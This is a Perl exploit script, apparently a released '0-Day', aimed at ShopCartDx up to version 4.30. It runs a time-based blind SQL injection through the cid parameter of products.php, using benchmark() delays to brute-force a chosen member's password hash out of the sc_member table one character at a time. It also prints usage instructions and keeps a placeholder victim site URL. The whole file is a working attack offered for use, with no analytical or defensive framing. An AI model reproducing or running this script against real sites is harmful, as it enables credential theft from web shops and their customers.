#!/usr/bin/perl
#[0-Day] ShopCartDx <= v4.30 (products.php) Remote Blind SQL Injection Exploit
#Coded By Dante90, WaRWolFz Crew
#Bug Discovered By: Dante90, WaRWolFz Crew

use strict;
use LWP::UserAgent;

use HTTP::Request::Common;
use Time::HiRes;
use IO::Socket;

my ($Hash,$Time,$Time_Start,$Time_End,$Response);
my($Start,$End);
my @chars = (48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122);
my $Host = "http://www.victime_site.org/path/"; #Insert Victime Web Site Link (Example: http://<server>/trafficdemos/shopcartdx1/)
my $Member_ID  = shift or &usage;
my $Method = HTTP::Request->new(GET => $Host);
my $HTTP = new LWP::UserAgent;
my $Referrer = "http://www.warwolfz.org/";
my $DefaultTime = request($Referrer);

sub Blind_SQL_Jnjection{
	my ($dec,$hex) = @_;
	return "./products.php?cid=-1 OR 1!=(SELECT IF((ASCII(SUBSTRING(`password`,${dec},1))=${hex}),benchmark(200000000,CHAR(0)),0) FROM `sc_member` WHERE `mid`=${Member_ID})/*";
}

for(my $I=1; $I<=15; $I++){ #N Hash characters
	for(my $J=0; $J<=62; $J++){ #0-9, A-Z, a-z
		$Time_Start = time();
		$HTTP->get($Host.Blind_SQL_Jnjection($I,$chars[$J]));
		$Time_End = time();
		$Time = request($Referrer);
		refresh($Host, $DefaultTime, $J, $Hash, $Time, $I);
		if($Time_End - $Time_Start > 6){
			$Time = request($Referrer);
			refresh($Host, $DefaultTime, $J, $Hash, $Time, $I);
			if($Time_End - $Time_Start > 6){
				syswrite(STDOUT,chr($chars[$J]));
				$Hash .= chr($chars[$J]);
				$Time = request($Referrer);
				refresh($Host, $DefaultTime, $J, $Hash, $Time, $I);
				last;
			}
		}
	}
	if($I == 1 && length $Hash < 0 && !$Hash){
		print " * Exploit Failed                                     *\n";
		print " ------------------------------------------------------ \n";
		exit;
	}
	if($I == 15 || length $Hash < $I){
		print " * Exploit Successfully Executed                      *\n";
		print " ------------------------------------------------------\n ";
		system("pause");
	}
}

sub usage{
	system("cls");
	{
		print " \n [0-Day] ShopCartDx <= v4.30 (products.php) Remote Blind SQL Injection Exploit\n";
		print " ------------------------------------------------------ \n";
		print " * USAGE:                                             *\n";
		print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
		print " * perl name_exploit.pl [uid]                         *\n";
		print " ------------------------------------------------------ \n";
		print " *         Powered By Dante90, WaRWolFz Crew          *\n";
		print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
		print " ------------------------------------------------------ \n";
	};
	exit;
}

sub request{
	$Referrer = $_[0];
	$Method->referrer($Referrer);
	$Start = Time::HiRes::time();
	$Response = $HTTP->request($Method);
	$Response->is_success() or die "$Host : ", $Response->message,"\n";
	$End = Time::HiRes::time();
	$Time = $End - $Start;
	return $Time;
}

sub refresh{
	system("cls");
	{
		print " \n [0-Day] ShopCartDx <= v4.30 (products.php) Remote Blind SQL Injection Exploit\n";
		print " ------------------------------------------------------ \n";
		print " * USAGE:                                             *\n";
		print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
		print " * perl name_exploit.pl [uid]                         *\n";
		print " ------------------------------------------------------ \n";
		print " *         Powered By Dante90, WaRWolFz Crew          *\n";
		print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
		print " ------------------------------------------------------ \n";
	};
	print " * Victime Site: " . $_[0] . "\n";
	print " * Default Time: " . $_[1] . " seconds\n";
	print " * BruteForcing Hash: " . chr($chars[$_[2]]) . "\n";
	print " * BruteForcing N Char Hash: " . $_[5] . "\n";
	print " * SQL Time: " . $_[4] . " seconds\n";
	print " * Password: " . $_[3] . "\n";
}

#WaRWolFz Crew